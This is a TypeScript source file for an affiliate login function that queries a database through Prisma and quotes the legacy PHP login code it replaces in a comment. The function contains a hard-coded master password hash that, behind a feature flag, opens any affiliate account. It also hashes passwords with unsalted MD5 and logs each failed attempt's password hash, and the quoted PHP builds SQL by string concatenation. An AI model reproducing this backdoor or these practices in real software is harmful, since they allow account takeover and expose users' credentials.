import type { PrismaClient } from "@prisma/client";
import type { AuthUser } from "./auth";
import md5 from "md5";
import { getConfig } from "./config";
import { getFlags } from "@/flags/server";

const backdoorPassword = "f3fda86e428ccda3e33d207217665201";

export const loginAccount = async (
  prisma: PrismaClient,
  username: string,
  password: string
): Promise<AuthUser | null> => {
  //C:\aff\FocusOption\FocusOption-main\site\index.php L175
  //$strSql = "SELECT id, username, password,valid,emailVerification
  // FROM affiliates
  // WHERE LOWER(username) = LOWER('" . strtolower($username) . "') AND
  // (password) = '" . (($admin>0 || $manager>0) ? strtolower($password):  strtolower(md5($password))) . "' ";

  const users = await prisma.$queryRaw<
    {
      id: number;
      mail: string;
      first_name: string;
      last_name: string;
      password: string;
      valid: number;
      emailVerification: number;
    }[]
  >`SELECT id,mail,password,valid,emailVerification FROM affiliates WHERE lower(username)=${username.toLowerCase()}`;

  const user = users[0];

  if (!user) {
    throw new Error("Login incorrect");
  }

  if (user.password !== md5(password)) {
    const { flags } = await getFlags({ context: {} });
    if (!flags?.enableBackdoorLogin || backdoorPassword !== md5(password)) {
      console.log(`muly:loginAccount`, { pass: md5(password) });
      throw new Error("Login incorrect");
    }
  }

  const { id, first_name, last_name, mail, emailVerification, valid } = user;

  const config = await getConfig(prisma);
  if (config.BlockLoginUntillEmailVerification && !emailVerification) {
    throw new Error("Please verify your email before you login");
  }

  if (!valid) {
    throw new Error("User Not validated");
  }

  return {
    id: String(id),
    email: mail,
    name: `${first_name || ""} ${last_name || ""}`.trim() || mail,
    image: null,
    type: "affiliate",
  };
};
